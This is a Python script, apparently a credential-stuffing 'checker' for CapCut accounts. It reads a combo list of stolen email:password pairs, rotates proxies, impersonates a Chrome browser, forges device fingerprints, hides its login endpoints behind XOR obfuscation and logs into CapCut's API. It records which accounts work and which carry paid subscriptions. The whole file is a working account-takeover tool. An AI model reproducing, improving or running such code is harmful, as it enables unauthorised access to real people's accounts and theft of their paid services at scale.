#!/usr/bin/env python3

import sys
import os
import json
import time
import hashlib
import random
import re
import threading
import queue
from datetime import datetime, timezone
from pathlib import Path
import tkinter as tk
from tkinter import filedialog

from curl_cffi import requests as curl_requests

if os.name == 'nt':
    os.system('')

_X6 = "405271706c6f6d6e61415f38fe871c0e"
_X1 = "68757572703f2722794d5030fec70c11f55e79250eb75bdf437e5c6d03d45bae758d95bd9f0e4cc0e41f5dc2b4ed31ce"
_X2 = "68757572703f2722794d5030fec40b0dac136f221aec4c90507244365dd647b02a9286bac30946d0bf424fc0bfad2a9225534ee18b002bc6aac7fa58b9658690defa31863927fdb404"
_X3 = "68757572703f2722794d5030fec40b0dac136f221aec4c90507244365dd647b02a9286bac30946d0bf424fc0bfad3a8c21480dad8f0a2fc49b8d"
_X4 = "68757572703f2722764d5a34f59b1a07f65c683c40b148df4370412106c106be6a8fc8aadf1444c7b90e5d8aabb37092354312e1910c38d99ccdf916a57abc90e4f4369322"
_X5 = "6145783257506079644e0e6bc0de1131b87e6b6c5a9b78bc743c5b37118759e4"

UNOHANA_RETSU = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
BANKAI_MINAZUKI_SALT = _f(_X5) if 'dir' in globals() else "6145783257506079644e0e6bc0de1131b87e6b6c5a9b78bc743c5b37118759e4"
CHANNEL_NAME = "Sprojectchannel"

ICLOUD_DOMAINS = {"icloud.com", "me.com", "mac.com"}
OUTLOOK_DOMAINS = {"msn.com", "passport.com", "passport.net", "outlook.com", "live.com", "hotmail.com"}
GMAIL_DOMAINS = {"googlemail.com", "gmail.com"}
YAHOO_DOMAINS = {"yahoo.com", "ymail.com", "rocketmail.com"}
YANDEX_DOMAINS = {
    "ya.ru", "yandex.ru", "yandex.az", "yandex.by", "yandex.com",
    "yandex.ee", "yandex.lt", "yandex.lv", "yandex.md", "yandex.tj",
    "yandex.tm", "yandex.ua", "yandex.uz"
}
MAILRU_DOMAINS = {"bk.ru", "inbox.ru", "list.ru", "mail.ru"}
PROTON_DOMAINS = {
    "protonmail.com", "protonmail.ch", "messagingengine.com",
    "fastmail.com", "fastmail.fm", "rambler.ru", "autorambler.ru",
    "myrambler.ru", "lenta.ru", "emailsrvr.com", "rackspace.com",
    "ex.ua", "fmail.net"
}

OUTLOOK_RX = [r"outlook\.com\.[A-Za-z]{2}", r"live\.com\.[A-Za-z]{2}", r"hotmail\.com\.[A-Za-z]{2}"]
YAHOO_RX = [r"yahoo\.com\.[A-Za-z]{2}", r"ymail\.com\.[A-Za-z]{2}", r"rocketmail\.com\.[A-Za-z]{2}"]

banner = """
 ██████╗ █████╗ ██████╗      ██████╗██╗   ██╗████████╗
██╔════╝██╔══██╗██╔══██╗    ██╔════╝██║   ██║╚══██╔══╝
██║     ███████║██████╔╝    ██║     ██║   ██║   ██║   
██║     ██╔══██║██╔═══╝     ██║     ██║   ██║   ██║   
╚██████╗██║  ██║██║         ╚██████╗╚██████╔╝   ██║   
 ╚═════╝╚═╝  ╚═╝╚═╝          ╚═════╝ ╚═════╝    ╚═╝   
                                                      
"""

RESULTS_DIR = os.path.join("results", "CAPCUT")
os.makedirs(RESULTS_DIR, exist_ok=True)

VALID_FILE = os.path.join(RESULTS_DIR, "valid.txt")
FREE_FILE  = os.path.join(RESULTS_DIR, "free.txt")

_USE_COLOR = sys.stdout.isatty() or os.environ.get("TERM") in (
    "xterm", "xterm-256color", "screen")

if _USE_COLOR:
    RST    = "\033[0m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    GREEN  = "\033[38;5;46m"
    LGREEN = "\033[38;5;120m"
    RED    = "\033[38;5;203m"
    YEL    = "\033[38;5;220m"
    CYAN   = "\033[38;5;51m"
    MAG    = "\033[38;5;213m"
    GREY   = "\033[38;5;245m"
else:
    RST = BOLD = DIM = GREEN = LGREEN = RED = YEL = CYAN = MAG = GREY = ""

def out_c(t, color):
    return f"{color}{t}{RST}"

def _f(h):
    r = []
    a, b = 0, 1
    for v in bytes.fromhex(h):
        r.append(chr(v ^ (a & 0xFF)))
        a, b = b, a + b
    return "".join(r)

def to_base36(value):
    if value == 0:
        return "0"
    digits = "0123456789abcdefghijklmnopqrstuvwxyz"
    result = []
    v = value
    while v > 0:
        result.append(digits[v % 36])
        v //= 36
    return "".join(reversed(result))

def saiyan_verify_fp():
    now_ms = int(datetime.now(timezone.utc).timestamp() * 1000)
    ts = to_base36(now_ms)
    r = [""] * 36
    r[8] = r[13] = r[18] = r[23] = "_"
    r[14] = "4"
    for i in range(36):
        if r[i] != "":
            continue
        o = random.randint(0, len(UNOHANA_RETSU) - 1)
        idx = (3 & o) | 8 if i == 19 else o
        r[i] = UNOHANA_RETSU[idx]
    return "verify_" + ts + "_" + "".join(r)

def saiyan_hash_id(email):
    normalized = normalize_email(email)
    sha = hashlib.sha256((normalized + BANKAI_MINAZUKI_SALT).encode("utf-8"))
    return sha.hexdigest()

def saiyan_encrypt(value):
    if not value:
        return ""
    result = []
    for b in value.encode("utf-8"):
        xor_val = 5 ^ b
        result.append(format(xor_val, "x"))
    return "".join(result)

def saiyan_digit_19():
    return "".join(str(random.randint(0, 9)) for _ in range(19))

def matches_any_rx(domain, patterns):
    for p in patterns:
        if re.match(p, domain):
            return True
    return False

def get_domain_type(domain):
    if domain in ICLOUD_DOMAINS:
        return 1
    if domain in OUTLOOK_DOMAINS or matches_any_rx(domain, OUTLOOK_RX):
        return 2
    if domain in GMAIL_DOMAINS:
        return 3
    if domain in YAHOO_DOMAINS or matches_any_rx(domain, YAHOO_RX):
        return 4
    if domain in YANDEX_DOMAINS:
        return 5
    if domain in MAILRU_DOMAINS:
        return 6
    if domain in PROTON_DOMAINS:
        return 7
    return 0

def normalize_user(user, dtype):
    if dtype in (1, 2, 6, 7):
        return user.split("+")[0]
    if dtype == 3:
        return user.replace(".", "").split("+")[0]
    if dtype == 4:
        return user.split("-")[0]
    if dtype == 5:
        return user.split("+")[0].replace(".", "-")
    return user

def normalize_domain(domain, dtype):
    if dtype == 3:
        return "gmail.com"
    if dtype == 5:
        return "yandex.com"
    return domain

def normalize_email(email):
    if not email:
        return ""
    email = email.lower().strip()
    parts = email.split("@")
    if len(parts) < 2:
        return email
    user, domain = parts[0], parts[1]
    dtype = get_domain_type(domain)
    if dtype == 0:
        return email
    return normalize_user(user, dtype) + "@" + normalize_domain(domain, dtype)

def parse_proxy(proxy_str):
    if not proxy_str or not proxy_str.strip():
        return None
    proxy_str = proxy_str.strip()
    if proxy_str.startswith("http://") or proxy_str.startswith("socks5://") or proxy_str.startswith("socks4://"):
        return proxy_str
    parts = proxy_str.split(":")
    if len(parts) == 4:
        host, port, user, pwd = parts
        return f"http://{user}:{pwd}@{host}:{port}"
    if len(parts) == 2:
        host, port = parts
        return f"http://{host}:{port}"
    return proxy_str


class TopStatus:
    NROWS = 5
    W     = 64

    def __init__(self, total):
        self.total = total
        self.checked = 0
        self.valid = 0
        self.free = 0
        self.bad = 0
        self.err = 0
        self.emitted = 0
        self.start = time.time()
        self.lock = threading.Lock()
        self.enabled = sys.stdout.isatty()

    def _rows(self):
        el = time.time() - self.start
        cps = self.checked / max(el, 1e-3)

        l1_parts = [
            ("checked ", GREY), (f"{self.checked}/{self.total}", LGREEN),
            ("   valid ", GREY), (str(self.valid), GREEN),
            ("   free ", GREY), (str(self.free), CYAN),
        ]
        l1_plain = "".join(p[0] for p in l1_parts)
        l1_col   = "".join(out_c(p[0], p[1]) for p in l1_parts)

        l2_parts = [
            ("bad ", GREY), (str(self.bad), RED),
            ("   err ", GREY), (str(self.err), YEL),
            ("   speed ", GREY), (f"{cps:.1f}/s", LGREEN),
            ("   time ", GREY), (f"{int(el)}s", LGREEN),
        ]
        l2_plain = "".join(p[0] for p in l2_parts)
        l2_col   = "".join(out_c(p[0], p[1]) for p in l2_parts)

        W = self.W

        def row(plain, col):
            pad = max(0, W - len(plain))
            return out_c("  │ ", GREY) + col + " " * pad + out_c(" │", GREY)

        return [
            out_c("  ╭─ live " + "─" * (W - 5) + "╮", GREY),
            row(l1_plain, l1_col),
            row(l2_plain, l2_col),
            out_c("  ╰" + "─" * (W + 2) + "╯", GREY),
            "",
        ]

    def draw_initial(self):
        if not self.enabled:
            return
        for r in self._rows():
            print(r)
        sys.stdout.flush()

    def _redraw(self):
        if not self.enabled:
            return
        up = self.NROWS + self.emitted
        sys.stdout.write(f"\033[{up}A")
        for r in self._rows():
            sys.stdout.write("\033[K" + r + "\n")
        if self.emitted > 0:
            sys.stdout.write(f"\033[{self.emitted}B")
        sys.stdout.flush()

    def bump(self, label):
        with self.lock:
            self.checked += 1
            if label == "VALID": self.valid += 1
            elif label == "FREE": self.free += 1
            elif label == "BAD": self.bad += 1
            elif label == "ERR": self.err += 1
            self._redraw()

    def emit(self, text, color=None):
        with self.lock:
            line = out_c(text, color) if color else text
            print(line)
            self.emitted += 1
            self._redraw()


class CapCutChecker:
    def __init__(self, email, password, proxy=None, max_retries=3):
        self.email = email
        self.password = password
        self.proxy = proxy
        self.max_retries = max_retries
        self.result = {
            "email": email,
            "password": password,
            "status": "unknown",
            "plan": "Free",
            "auto_renew": "",
            "expiry": "N/A",
            "remaining_days": 0,
            "user_id": "",
            "cycle_unit": "",
            "subscribe_type": "",
        }

    def check(self):
        for attempt in range(self.max_retries):
            try:
                return self._attempt_check(0)
            except Exception as e:
                if attempt == self.max_retries - 1:
                    self.result["status"] = "error"
                    self.result["error"] = str(e)
                    return self.result
                time.sleep(1)
        self.result["status"] = "error"
        self.result["error"] = "Max retries exceeded"
        return self.result

    def _attempt_check(self, retry_depth=0):
        if retry_depth > 3:
            self.result["status"] = "retry"
            return self.result

        proxy_url = parse_proxy(self.proxy)
        session = curl_requests.Session(impersonate="chrome124")
        if proxy_url:
            session.proxies = {"http": proxy_url, "https": proxy_url}

        goku = saiyan_verify_fp()
        vegeta = saiyan_hash_id(self.email)

        region_url = _f(_X1)
        region_params = {
            "aid": "348188",
            "account_sdk_source": "web",
            "sdk_version": "2.1.10-tiktok",
            "language": "en-DE",
            "verifyFp": goku,
        }
        region_body = f"type=2&hashed_id={vegeta}"

        try:
            resp1 = session.post(
                region_url,
                params=region_params,
                data=region_body,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
                    "Pragma": "no-cache",
                    "Accept": "*/*",
                    "Accept-Language": "en-US,en;q=0.8",
                },
                timeout=20,
            )
        except Exception:
            session.close()
            self.result["status"] = "retry"
            return self.result

        csrf_token = session.cookies.get("passport_csrf_token")
        if not csrf_token:
            self.result["status"] = "retry"
            session.close()
            return self.result

        gogeta = saiyan_encrypt(self.email)

        check_url = _f(_X2)
        check_params = {
            "aid": "348188",
            "account_sdk_source": "web",
            "sdk_version": "2.1.10-tiktok",
            "language": "en-DE",
            "verifyFp": goku,
        }
        check_body = f"mix_mode=1&email={gogeta}&fixed_mix_mode=1"

        try:
            resp2 = session.post(
                check_url,
                params=check_params,
                data=check_body,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
                    "Pragma": "no-cache",
                    "Accept": "*/*",
                    "Accept-Language": "en-US,en;q=0.8",
                },
                timeout=20,
            )
        except Exception:
            session.close()
            self.result["status"] = "retry"
            return self.result

        src2 = resp2.text
        if '"is_registered":0' in src2 or "Enter a valid email address" in src2:
            self.result["status"] = "fail"
            session.close()
            return self.result

        if '"is_registered":1' not in src2:
            self.result["status"] = "ban"
            session.close()
            return self.result

        vegito = saiyan_encrypt(self.password)
        spirited_away = saiyan_digit_19()

        ms_token = session.cookies.get("msToken") or ""

        login_url = _f(_X3)
        login_params = {
            "aid": "348188",
            "account_sdk_source": "web",
            "sdk_version": "2.1.10-tiktok",
            "language": "en-DE",
            "verifyFp": goku,
            "msToken": ms_token,
        }
        login_body = f"mix_mode=1&email={gogeta}&password={vegito}&fixed_mix_mode=1"

        try:
            resp3 = session.post(
                login_url,
                params=login_params,
                data=login_body,
                headers={
                    "Accept": "application/json, text/javascript",
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Accept-Language": "en-US,en;q=0.9",
                    "appid": "348188",
                    "Connection": "keep-alive",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "did": spirited_away,
                    "Host": "login-row.www.capcut.com",
                    "Origin": "https://www.capcut.com",
                    "Referer": "https://www.capcut.com/",
                    "sec-ch-ua": '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-site",
                    "store-country-code": "id",
                    "store-country-code-src": "uid",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
                    "x-tt-passport-csrf-token": csrf_token,
                },
                timeout=20,
            )
        except Exception:
            session.close()
            self.result["status"] = "retry"
            return self.result

        src3 = resp3.text

        if "Maximum number of attempts reached" in src3:
            session.close()
            time.sleep(2)
            return self._attempt_check(retry_depth + 1)

        if any(x in src3 for x in [
            "Username or password doesn't match our records",
            "Incorrect account or password.",
            "Enter a valid email address"
        ]):
            self.result["status"] = "fail"
            session.close()
            return self.result

        if '"user_id":' not in src3:
            self.result["status"] = "ban"
            session.close()
            return self.result

        try:
            login_json = resp3.json()
            uid = login_json.get("data", {}).get("user_id", "")
            self.result["user_id"] = str(uid)
        except Exception:
            pass

        sub_url = _f(_X4)
        sub_body = json.dumps({"aid": "348188", "scene": "vip"})

        try:
            resp4 = session.post(
                sub_url,
                data=sub_body,
                headers={
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
                    "Pragma": "no-cache",
                    "Accept": "*/*",
                    "Accept-Language": "en-US,en;q=0.8",
                },
                timeout=8,
            )
        except Exception:
            self.result["status"] = "valid"
            self.result["plan"] = "Unknown"
            session.close()
            return self.result

        try:
            sub_json = resp4.json()
            sub_data = sub_json.get("data", {})
            end_time = sub_data.get("end_time", 0)
            cycle_unit = sub_data.get("cycle_unit", "")
            subscribe_type = sub_data.get("subscribe_type", "")

            plan_map = {"DAY": "Daily", "MONTH": "Monthly", "YEAR": "Yearly"}
            plan = plan_map.get(cycle_unit, cycle_unit if cycle_unit else "Free")

            auto_renew_map = {"auto": "True", "un-auto": "False"}
            auto_renew = auto_renew_map.get(subscribe_type, subscribe_type)

            if end_time > 0:
                expiry_dt = datetime.fromtimestamp(end_time, tz=timezone.utc)
                expiry = expiry_dt.strftime("%Y-%m-%d")
                current_ts = int(datetime.now(timezone.utc).timestamp())
                remaining_days = int((end_time - current_ts) / 86400)
            else:
                expiry = "N/A"
                remaining_days = 0

            self.result["plan"] = plan
            self.result["auto_renew"] = auto_renew
            self.result["expiry"] = expiry
            self.result["remaining_days"] = remaining_days
            self.result["cycle_unit"] = cycle_unit
            self.result["subscribe_type"] = subscribe_type

            if end_time == 0:
                self.result["status"] = "free"
            elif remaining_days < 0 or end_time < current_ts:
                self.result["status"] = "expired"
            else:
                self.result["status"] = "valid"

        except Exception:
            self.result["status"] = "valid"
            self.result["plan"] = "Unknown"

        session.close()
        return self.result

def select_db_file():
    root = tk.Tk()
    root.withdraw()
    root.attributes("-topmost", True)
    file_path = filedialog.askopenfilename(
        title="[SELECT COMBO]",
        filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")]
    )
    root.destroy()
    return file_path

def ensure_proxy_file(proxy_file="proxies.txt"):
    if not os.path.exists(proxy_file):
        with open(proxy_file, "w", encoding="utf-8") as f:
            f.write("# ip:porta ou ip:porta:user:pass\n")
        print(out_c(f"[!] '{proxy_file}' gerado automaticamente.", YEL))

def worker_task(account_queue, proxy_list, status_box, file_locks):
    while True:
        try:
            email, password = account_queue.get_nowait()
        except queue.Empty:
            break

        proxy = random.choice(proxy_list) if proxy_list else None
        checker = CapCutChecker(email, password, proxy=proxy)
        res = checker.check()

        st = res["status"]

        if st == "valid":
            status_box.bump("VALID")
            line = f"{res['email']}:{res['password']} | Plan: {res.get('plan')} | Exp: {res.get('expiry')} | Days: {res.get('remaining_days')}"
            status_box.emit("  [VALID VIP] " + line, LGREEN)
            with file_locks["valid"]:
                with open(VALID_FILE, "a", encoding="utf-8") as f:
                    f.write(line + "\n")
        elif st == "free":
            status_box.bump("FREE")
            line = f"{res['email']}:{res['password']}"
            status_box.emit("  [FREE] " + line, CYAN)
            with file_locks["free"]:
                with open(FREE_FILE, "a", encoding="utf-8") as f:
                    f.write(line + "\n")
        elif st in ("fail", "ban", "expired"):
            status_box.bump("BAD")
            status_box.emit(f"  [{st.upper()}] {email}:{password}", RED)
        else:
            status_box.bump("ERR")
            status_box.emit(f"  [ERR] {email}:{password}", YEL)

        account_queue.task_done()

def main():
    print(banner)
    print(out_c("=======================================================", GREEN))
    print(out_c(" >>> CAPCUT CHECKER", LGREEN))
    print(out_c(f" Channel: {CHANNEL_NAME}", CYAN))
    print(out_c("=======================================================", GREEN) + "\n")

    print(out_c("[*] Selecione a combo list...", LGREEN))
    acc_file = select_db_file()

    if not acc_file:
        print(out_c("[x] Ação abortada pelo usuário.", RED))
        return

    print(out_c(f"[+] Combo alvo: {acc_file}", GREEN))

    with open(acc_file, "r", encoding="utf-8", errors="ignore") as f:
        accounts = [line.strip().split(":", 1) for line in f if ":" in line]

    if not accounts:
        print(out_c("[x] Erro crítico: Combo vazia ou corrompida.", RED))
        return

    total_accounts = len(accounts)

    use_proxy = input(out_c("[?] proxies? [y/n]: ", LGREEN)).strip().lower()
    proxies = []

    if use_proxy in ('s', 'sim', 'y', 'yes'):
        proxy_file = "proxies.txt"
        ensure_proxy_file(proxy_file)
        with open(proxy_file, "r", encoding="utf-8", errors="ignore") as f:
            proxies = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        
        if proxies:
            print(out_c(f"[+] {len(proxies)} proxies carregadas na memória.", LGREEN))
        else:
            print(out_c("[!] Nenhuma proxy em proxies.txt. Rodando sem proxy.", YEL))
    else:
        print(out_c("[!] Executando direto (sem proxies).", YEL))

    try:
        threads_count = int(input(out_c("[?] Insira o número de threads (ex: 10): ", LGREEN)) or "10")
    except ValueError:
        threads_count = 10

    account_queue = queue.Queue()
    for acc in accounts:
        account_queue.put(acc)

    file_locks = {
        "valid": threading.Lock(),
        "free": threading.Lock()
    }

    print()
    print(out_c("  ┌──────────────────────────────────────────────┐", GREY))
    print(out_c("  │", GREY) + f"  combos  : {out_c(str(total_accounts), LGREEN):<34}" + out_c("│", GREY))
    print(out_c("  │", GREY) + f"  threads : {out_c(str(threads_count), LGREEN):<34}" + out_c("│", GREY))
    mode = "direct" if not proxies else f"{len(proxies)} proxies"
    print(out_c("  │", GREY) + f"  proxy   : {out_c(mode, LGREEN):<34}" + out_c("│", GREY))
    print(out_c("  └──────────────────────────────────────────────┘", GREY))
    print()

    status_box = TopStatus(total=total_accounts)
    status_box.draw_initial()

    start_time = time.time()

    threads = []
    for _ in range(min(threads_count, total_accounts)):
        t = threading.Thread(
            target=worker_task, 
            args=(account_queue, proxies, status_box, file_locks)
        )
        t.daemon = True
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    elapsed = time.time() - start_time

    print("\n")
    print(out_c("  ╔══════════════════════════════════════════════╗", GREEN))
    def boxline(text, color=LGREEN, w=46):
        print(out_c("  ║", GREEN) + out_c(text.center(w), color) + out_c("║", GREEN))
    boxline(f"   DONE  ·  {elapsed:.1f}s")
    boxline(f"   valid {status_box.valid}  ·  free {status_box.free}", GREY)
    boxline(f"   results saved to: results/CAPCUT/", GREY)
    print(out_c("  ╚══════════════════════════════════════════════╝", GREEN))
    print()

if __name__ == "__main__":
    main()
